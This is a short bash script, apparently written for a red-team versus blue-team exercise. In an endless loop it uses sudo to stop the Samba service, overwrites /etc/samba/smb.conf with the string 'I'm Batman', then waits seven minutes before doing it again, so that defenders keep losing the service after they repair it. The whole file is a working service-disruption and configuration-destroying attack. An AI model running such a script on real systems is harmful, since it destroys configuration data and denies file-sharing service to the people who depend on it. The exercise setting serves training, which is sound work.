#!/bin/bash

# Loop forever
while true
do
 # Stop the smb service and overwrite the config file
 sudo service smbd stop
 echo "I'm Batman" > '/etc/samba/smb.conf'
 
 #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
 sleep 420
done
